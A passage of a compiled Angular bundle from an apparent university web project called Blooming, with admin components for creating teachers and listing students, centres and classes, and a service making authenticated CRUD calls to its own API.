        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(31, "div", 17)(32, "p", 18);
        \u0275\u0275text(33, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Nombre"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("ID_Centro"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("NumAlumnos"));
      }
    },
    dependencies: [NgIf, RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let CrearClasesComponent2 = _CrearClasesComponent;
  return CrearClasesComponent2;
})();

// src/app/pages/admin/crear-profesores/crear-profesores.component.ts
var import_sweetalert26 = __toESM(require_sweetalert2_all());

// src/app/services/profesores.service.ts
var ProfesorService = /* @__PURE__ */ (() => {
  const _ProfesorService = class _ProfesorService {
    constructor(http) {
      this.http = http;
      this.basePath = `${environment.base_url}/profesores/`;
    }
    // Opciones Http
    getHeader() {
      this.httpOptions = {
        headers: this.addToken()
      };
    }
    getToken() {
      let token;
      if (typeof localStorage !== "undefined") {
        token = localStorage.getItem("token");
      }
      return token;
    }
    addToken() {
      const token = this.getToken();
      return new HttpHeaders({
        "Content-Type": "application/json",
        "x-token": `${token}`
      });
    }
    //LLAMADAS API  
    getProfesores() {
      this.getHeader();
      return this.http.get(this.basePath, this.httpOptions);
    }
    deleteProfesor(id) {
      this.getHeader();
      return this.http.delete(this.basePath + id, this.httpOptions);
    }
    postProfesor(formData) {
      this.getHeader();
      return this.http.post(this.basePath, formData, this.httpOptions);
    }
    putProfesor(formData) {
      this.getHeader();
      return this.http.put(this.basePath + formData.ID_Profesor, formData, this.httpOptions);
    }
  };
  _ProfesorService.\u0275fac = function ProfesorService_Factory(t) {
    return new (t || _ProfesorService)(\u0275\u0275inject(HttpClient));
  };
  _ProfesorService.\u0275prov = /* @__PURE__ */ \u0275\u0275defineInjectable({
    token: _ProfesorService,
    factory: _ProfesorService.\u0275fac,
    providedIn: "root"
  });
  let ProfesorService2 = _ProfesorService;
  return ProfesorService2;
})();

// src/app/pages/admin/crear-profesores/crear-profesores.component.ts
function CrearProfesoresComponent_p_16_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 25);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearProfesoresComponent_p_21_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 25);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearProfesoresComponent_p_26_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 25);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearProfesoresComponent_p_31_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 25);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearProfesoresComponent_p_36_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 25);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
function CrearProfesoresComponent_p_41_Template(rf, ctx) {
  if (rf & 1) {
    \u0275\u0275elementStart(0, "p", 25);
    \u0275\u0275text(1, "El Centro es obligatorio");
    \u0275\u0275elementEnd();
  }
}
var CrearProfesoresComponent = /* @__PURE__ */ (() => {
  const _CrearProfesoresComponent = class _CrearProfesoresComponent {
    constructor(fb, profesorService, router) {
      this.fb = fb;
      this.profesorService = profesorService;
      this.router = router;
      this.sendForm = false;
      this.form = this.fb.group({
        Nombre: ["", [Validators.required]],
        Apellidos: ["", [Validators.required]],
        Email: ["", [Validators.required, Validators.email]],
        Contrase\u00F1a: ["", [Validators.required]],
        ID_Centro: ["", [Validators.required]],
        ID_Clase: ["", [Validators.required]]
      });
    }
    crearProfesor() {
      this.sendForm = true;
      if (!this.form.valid) {
        console.log("Errores en el formulario");
      } else {
        this.profesorService.postProfesor(this.form.value).subscribe((response) => {
          this.router.navigate(["admin/ver-profesores"]);
        }, (error) => {
          console.error("Error de creaci\xF3n:", error);
          import_sweetalert26.default.fire(error.error.message);
        });
      }
    }
    validarForm(campo) {
      return this.form.get(campo)?.valid || !this.sendForm;
    }
  };
  _CrearProfesoresComponent.\u0275fac = function CrearProfesoresComponent_Factory(t) {
    return new (t || _CrearProfesoresComponent)(\u0275\u0275directiveInject(FormBuilder), \u0275\u0275directiveInject(ProfesorService), \u0275\u0275directiveInject(Router));
  };
  _CrearProfesoresComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _CrearProfesoresComponent,
    selectors: [["app-crear-profesores"]],
    decls: 49,
    vars: 7,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [3, "formGroup"], [1, "mb-3"], ["for", "Nombre", 1, "form-label"], ["formControlName", "Nombre", "id", "Nombre", 1, "form-control"], ["class", "text-danger", 4, "ngIf"], ["for", "Apellidos", 1, "form-label"], ["formControlName", "Apellidos", "id", "Apellidos", 1, "form-control"], ["for", "Email", 1, "form-label"], ["type", "email", "formControlName", "Email", "id", "Email", 1, "form-control"], ["for", "Contrase\xF1a", 1, "form-label"], ["type", "password", "formControlName", "Contrase\xF1a", "id", "Contrase\xF1a", 1, "form-control"], ["for", "ID_Centro", 1, "form-label"], ["formControlName", "ID_Centro", "id", "ID_Centro", 1, "form-control"], ["for", "ID_Clase", 1, "form-label"], ["formControlName", "ID_Clase", "id", "ID_Clase", 1, "form-control"], [1, "btn", "btn-danger", 3, "click"], ["routerLink", "/admin/ver-profesores", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "text-danger"]],
    template: function CrearProfesoresComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Crear Profesor");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "form", 6)(12, "div", 7)(13, "label", 8);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275element(15, "input", 9);
        \u0275\u0275elementEnd();
        \u0275\u0275template(16, CrearProfesoresComponent_p_16_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(17, "div", 7)(18, "label", 11);
        \u0275\u0275text(19, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275element(20, "input", 12);
        \u0275\u0275elementEnd();
        \u0275\u0275template(21, CrearProfesoresComponent_p_21_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(22, "div", 7)(23, "label", 13);
        \u0275\u0275text(24, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275element(25, "input", 14);
        \u0275\u0275elementEnd();
        \u0275\u0275template(26, CrearProfesoresComponent_p_26_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(27, "div", 7)(28, "label", 15);
        \u0275\u0275text(29, "Contrase\xF1a");
        \u0275\u0275elementEnd();
        \u0275\u0275element(30, "input", 16);
        \u0275\u0275elementEnd();
        \u0275\u0275template(31, CrearProfesoresComponent_p_31_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(32, "div", 7)(33, "label", 17);
        \u0275\u0275text(34, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(35, "input", 18);
        \u0275\u0275elementEnd();
        \u0275\u0275template(36, CrearProfesoresComponent_p_36_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(37, "div", 7)(38, "label", 19);
        \u0275\u0275text(39, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275element(40, "input", 20);
        \u0275\u0275elementEnd();
        \u0275\u0275template(41, CrearProfesoresComponent_p_41_Template, 2, 0, "p", 10);
        \u0275\u0275elementStart(42, "button", 21);
        \u0275\u0275listener("click", function CrearProfesoresComponent_Template_button_click_42_listener() {
          return ctx.crearProfesor();
        });
        \u0275\u0275text(43, "Aceptar");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(44, "button", 22);
        \u0275\u0275text(45, "Volver");
        \u0275\u0275elementEnd()()()()()()()();
        \u0275\u0275elementStart(46, "div", 23)(47, "p", 24);
        \u0275\u0275text(48, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(11);
        \u0275\u0275property("formGroup", ctx.form);
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Nombre"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Apellidos"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Email"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("Contrase\xF1a"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("ID_Centro"));
        \u0275\u0275advance(5);
        \u0275\u0275property("ngIf", !ctx.validarForm("ID_Clase"));
      }
    },
    dependencies: [NgIf, RouterLink, \u0275NgNoValidate, DefaultValueAccessor, NgControlStatus, NgControlStatusGroup, FormGroupDirective, FormControlName],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let CrearProfesoresComponent2 = _CrearProfesoresComponent;
  return CrearProfesoresComponent2;
})();

// src/app/pages/admin/ver-alumnos/ver-alumnos.component.ts
var import_sweetalert27 = __toESM(require_sweetalert2_all());
function VerAlumnosComponent_tbody_27_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 8);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 8);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 8);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 8);
    \u0275\u0275text(9);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(10, "td", 8);
    \u0275\u0275text(11);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(12, "td", 8);
    \u0275\u0275text(13);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(14, "td", 8)(15, "button", 14);
    \u0275\u0275listener("click", function VerAlumnosComponent_tbody_27_Template_button_click_15_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const alumno_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.editarAlumno(alumno_r1));
    });
    \u0275\u0275text(16, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(17, "button", 15);
    \u0275\u0275listener("click", function VerAlumnosComponent_tbody_27_Template_button_click_17_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const alumno_r1 = restoredCtx.$implicit;
      const ctx_r4 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r4.eliminarAlumno(alumno_r1.ID_Alumno));
    });
    \u0275\u0275text(18, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const alumno_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(alumno_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.Apellidos);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.Usuario);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.FechaNacimiento);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.NomClase);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(alumno_r1.NomCentro);
  }
}
var VerAlumnosComponent = /* @__PURE__ */ (() => {
  const _VerAlumnosComponent = class _VerAlumnosComponent {
    constructor(alumnoService, router) {
      this.alumnoService = alumnoService;
      this.router = router;
      this.alumnosData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getAlumnos();
    }
    getAlumnos() {
      this.alumnoService.getAlumnos().subscribe((res) => {
        console.log(res);
        this.alumnosData = res;
      });
    }
    eliminarAlumno(id) {
      import_sweetalert27.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.alumnoService.deleteAlumno(id).subscribe((res) => {
            this.getAlumnos();
          });
          import_sweetalert27.default.fire({
            title: "Alumno Eliminado",
            icon: "success"
          });
        }
      });
    }
    editarAlumno(alumno) {
      this.router.navigate(["admin/editar-alumnos"], {
        state: {
          alumno
        }
      });
    }
  };
  _VerAlumnosComponent.\u0275fac = function VerAlumnosComponent_Factory(t) {
    return new (t || _VerAlumnosComponent)(\u0275\u0275directiveInject(AlumnoService), \u0275\u0275directiveInject(Router));
  };
  _VerAlumnosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerAlumnosComponent,
    selectors: [["app-alumnos"]],
    decls: 37,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["href", "/admin/crear-alumnos", 1, "btn", "btn-danger"], ["href", "/admin/dashboard", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "btn", "btn-primary", 3, "click"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerAlumnosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Alumnos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(9, "div", 3)(10, "div", 4)(11, "table", 6)(12, "thead", 7)(13, "tr")(14, "th", 8);
        \u0275\u0275text(15, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(16, "th", 8);
        \u0275\u0275text(17, "Apellidos");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(18, "th", 8);
        \u0275\u0275text(19, "Usuario");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(20, "th", 8);
        \u0275\u0275text(21, "Fecha de nacimiento");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(22, "th", 8);
        \u0275\u0275text(23, "Clase");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(24, "th", 8);
        \u0275\u0275text(25, "Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275element(26, "th", 8);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(27, VerAlumnosComponent_tbody_27_Template, 19, 6, "tbody", 9);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(28, "a", 10);
        \u0275\u0275text(29, "Crear Alumno");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(30, "a", 11);
        \u0275\u0275text(31, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(32, "br")(33, "br");
        \u0275\u0275elementStart(34, "div", 12)(35, "p", 13);
        \u0275\u0275text(36, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(27);
        \u0275\u0275property("ngForOf", ctx.alumnosData.alumnos);
      }
    },
    dependencies: [NgForOf],
    styles: ["\n\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFtdLAogICJzb3VyY2VzQ29udGVudCI6IFtdLAogICJtYXBwaW5ncyI6ICIiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerAlumnosComponent2 = _VerAlumnosComponent;
  return VerAlumnosComponent2;
})();

// src/app/pages/admin/ver-centros/ver-centros.component.ts
var import_sweetalert28 = __toESM(require_sweetalert2_all());
function VerCentrosComponent_tbody_26_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 7);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 7);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 7);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 7);
    \u0275\u0275text(9);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(10, "td", 7);
    \u0275\u0275text(11);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(12, "td", 7);
    \u0275\u0275text(13);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(14, "td", 7)(15, "button", 13);
    \u0275\u0275listener("click", function VerCentrosComponent_tbody_26_Template_button_click_15_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const centro_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.editarCentro(centro_r1));
    });
    \u0275\u0275text(16, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(17, "button", 14);
    \u0275\u0275listener("click", function VerCentrosComponent_tbody_26_Template_button_click_17_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const centro_r1 = restoredCtx.$implicit;
      const ctx_r4 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r4.eliminarCentro(centro_r1.ID_Centro));
    });
    \u0275\u0275text(18, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const centro_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(centro_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(centro_r1.Email);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(centro_r1.Localidad);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(centro_r1.Provincia);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(centro_r1.Calle);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(centro_r1.CP);
  }
}
var VerCentrosComponent = /* @__PURE__ */ (() => {
  const _VerCentrosComponent = class _VerCentrosComponent {
    constructor(centroService, router) {
      this.centroService = centroService;
      this.router = router;
      this.centrosData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getCentros();
    }
    getCentros() {
      this.centroService.getCentros().subscribe((res) => {
        this.centrosData = res;
      });
    }
    eliminarCentro(id) {
      import_sweetalert28.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.centroService.deleteCentro(id).subscribe((res) => {
            this.getCentros();
          });
          import_sweetalert28.default.fire({
            title: "Centro Eliminado",
            icon: "success"
          });
        }
      });
    }
    editarCentro(centro) {
      this.router.navigate(["admin/editar-centros"], {
        state: {
          centro
        }
      });
    }
  };
  _VerCentrosComponent.\u0275fac = function VerCentrosComponent_Factory(t) {
    return new (t || _VerCentrosComponent)(\u0275\u0275directiveInject(CentroService), \u0275\u0275directiveInject(Router));
  };
  _VerCentrosComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerCentrosComponent,
    selectors: [["app-centros"]],
    decls: 36,
    vars: 1,
    consts: [[1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["routerLink", "/admin/crear-centros", 1, "btn", "btn-danger"], ["href", "/admin/dashboard", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "btn", "btn-primary", 3, "click"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerCentrosComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 1)(3, "div", 1)(4, "div", 2)(5, "div", 3)(6, "h5", 4);
        \u0275\u0275text(7, "Centros");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(8, "div", 2)(9, "div", 3)(10, "table", 5)(11, "thead", 6)(12, "tr")(13, "th", 7);
        \u0275\u0275text(14, "Nombre");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(15, "th", 7);
        \u0275\u0275text(16, "Email");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(17, "th", 7);
        \u0275\u0275text(18, "Localidad");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(19, "th", 7);
        \u0275\u0275text(20, "Provincia");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(21, "th", 7);
        \u0275\u0275text(22, "Calle");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(23, "th", 7);
        \u0275\u0275text(24, "CP");
        \u0275\u0275elementEnd();
        \u0275\u0275element(25, "th", 7);
        \u0275\u0275elementEnd()();
        \u0275\u0275template(26, VerCentrosComponent_tbody_26_Template, 19, 6, "tbody", 8);
        \u0275\u0275elementEnd()()();
        \u0275\u0275elementStart(27, "button", 9);
        \u0275\u0275text(28, "Crear Centro");
        \u0275\u0275elementEnd();
        \u0275\u0275elementStart(29, "a", 10);
        \u0275\u0275text(30, "Volver");
        \u0275\u0275elementEnd()()()()();
        \u0275\u0275element(31, "br")(32, "br");
        \u0275\u0275elementStart(33, "div", 11)(34, "p", 12);
        \u0275\u0275text(35, "\xA9 2023 Blooming. Proyecto acad\xE9mico de la Universidad de Alicante .");
        \u0275\u0275elementEnd()()()();
      }
      if (rf & 2) {
        \u0275\u0275advance(26);
        \u0275\u0275property("ngForOf", ctx.centrosData.centros);
      }
    },
    dependencies: [NgForOf, RouterLink],
    styles: ["\n\n.card-body[_ngcontent-%COMP%] {\n  -webkit-box-flex: 1;\n  -ms-flex: 1 1 auto;\n  flex: 1 1 auto;\n  padding: 20px 20px;\n  color: var(--bs-card-color);\n}\n/*# sourceMappingURL=data:application/json;base64,ewogICJ2ZXJzaW9uIjogMywKICAic291cmNlcyI6IFsic3JjL2FwcC9wYWdlcy9hZG1pbi92ZXItY2VudHJvcy92ZXItY2VudHJvcy5jb21wb25lbnQuY3NzIl0sCiAgInNvdXJjZXNDb250ZW50IjogWyIuY2FyZC1ib2R5IHtcclxuICAgIC13ZWJraXQtYm94LWZsZXg6IDE7XHJcbiAgICAtbXMtZmxleDogMSAxIGF1dG87XHJcbiAgICBmbGV4OiAxIDEgYXV0bztcclxuICAgIHBhZGRpbmc6IDIwcHggMjBweDtcclxuICAgIGNvbG9yOiB2YXIoLS1icy1jYXJkLWNvbG9yKTtcclxufSJdLAogICJtYXBwaW5ncyI6ICI7QUFBQSxDQUFDO0FBQ0csb0JBQWtCO0FBQ2xCLFlBQVUsRUFBRSxFQUFFO0FBQ2QsUUFBTSxFQUFFLEVBQUU7QUFDVixXQUFTLEtBQUs7QUFDZCxTQUFPLElBQUk7QUFDZjsiLAogICJuYW1lcyI6IFtdCn0K */"]
  });
  let VerCentrosComponent2 = _VerCentrosComponent;
  return VerCentrosComponent2;
})();

// src/app/pages/admin/ver-clases/ver-clases.component.ts
var import_sweetalert29 = __toESM(require_sweetalert2_all());
function VerClasesComponent_tbody_21_Template(rf, ctx) {
  if (rf & 1) {
    const _r3 = \u0275\u0275getCurrentView();
    \u0275\u0275elementStart(0, "tbody")(1, "tr")(2, "td", 8);
    \u0275\u0275text(3);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(4, "td", 8);
    \u0275\u0275text(5);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(6, "td", 8);
    \u0275\u0275text(7);
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(8, "td", 8)(9, "button", 14);
    \u0275\u0275listener("click", function VerClasesComponent_tbody_21_Template_button_click_9_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const clase_r1 = restoredCtx.$implicit;
      const ctx_r2 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r2.editarClase(clase_r1));
    });
    \u0275\u0275text(10, "M");
    \u0275\u0275elementEnd();
    \u0275\u0275elementStart(11, "button", 15);
    \u0275\u0275listener("click", function VerClasesComponent_tbody_21_Template_button_click_11_listener() {
      const restoredCtx = \u0275\u0275restoreView(_r3);
      const clase_r1 = restoredCtx.$implicit;
      const ctx_r4 = \u0275\u0275nextContext();
      return \u0275\u0275resetView(ctx_r4.eliminarClase(clase_r1.ID_Clase));
    });
    \u0275\u0275text(12, "E");
    \u0275\u0275elementEnd()()()();
  }
  if (rf & 2) {
    const clase_r1 = ctx.$implicit;
    \u0275\u0275advance(3);
    \u0275\u0275textInterpolate(clase_r1.Nombre);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(clase_r1.NumAlumnos);
    \u0275\u0275advance(2);
    \u0275\u0275textInterpolate(clase_r1.NomCentro);
  }
}
var VerClasesComponent = /* @__PURE__ */ (() => {
  const _VerClasesComponent = class _VerClasesComponent {
    constructor(claseService, router) {
      this.claseService = claseService;
      this.router = router;
      this.clasesData = [];
    }
    ngAfterViewInit() {
      this.tryLocalStorage();
    }
    tryLocalStorage() {
      this.getClases();
    }
    getClases() {
      this.claseService.getClases().subscribe((res) => {
        this.clasesData = res;
      });
    }
    eliminarClase(id) {
      import_sweetalert29.default.fire({
        title: "\xBFEst\xE1s seguro?",
        text: "Esta acci\xF3n no se podr\xE1 deshacer",
        icon: "warning",
        showCancelButton: true,
        confirmButtonColor: "#3085d6",
        cancelButtonColor: "#d33",
        confirmButtonText: "Eliminar"
      }).then((result) => {
        if (result.isConfirmed) {
          this.claseService.deleteClase(id).subscribe((res) => {
            this.getClases();
          });
          import_sweetalert29.default.fire({
            title: "Clase Eliminada",
            icon: "success"
          });
        }
      });
    }
    editarClase(clase) {
      this.router.navigate(["admin/editar-clases"], {
        state: {
          clase
        }
      });
    }
  };
  _VerClasesComponent.\u0275fac = function VerClasesComponent_Factory(t) {
    return new (t || _VerClasesComponent)(\u0275\u0275directiveInject(ClaseService), \u0275\u0275directiveInject(Router));
  };
  _VerClasesComponent.\u0275cmp = /* @__PURE__ */ \u0275\u0275defineComponent({
    type: _VerClasesComponent,
    selectors: [["app-clases"]],
    decls: 31,
    vars: 1,
    consts: [["id", "main-wrapper", "data-layout", "vertical", "data-navbarbg", "skin6", "data-sidebartype", "full", "data-sidebar-position", "fixed", "data-header-position", "fixed", 1, "page-wrapper"], [1, "body-wrapper", 2, "margin-left", "0"], [1, "container-fluid"], [1, "card"], [1, "card-body"], [1, "card-title", "fw-semibold", "mb-4"], [1, "table", "text-nowrap", "mb-0", "align-middle", 2, "background-color", "white", "border-radius", "1em"], [1, "text-dark", "fs-4"], [1, "border-bottom-0"], [4, "ngFor", "ngForOf"], ["href", "/admin/crear-clases", 1, "btn", "btn-danger"], ["href", "/admin/dashboard", 1, "btn", "btn-danger"], [1, "py-6", "px-6", "text-center"], [1, "copyright"], [1, "btn", "btn-primary", 3, "click"], [1, "btn", "btn-danger", 3, "click"]],
    template: function VerClasesComponent_Template(rf, ctx) {
      if (rf & 1) {
        \u0275\u0275elementStart(0, "div", 0)(1, "div", 1)(2, "div", 2)(3, "div", 2)(4, "div", 2)(5, "div", 3)(6, "div", 4)(7, "h5", 5);
        \u0275\u0275text(8, "Clases");
        \u0275\u0275elementEnd();
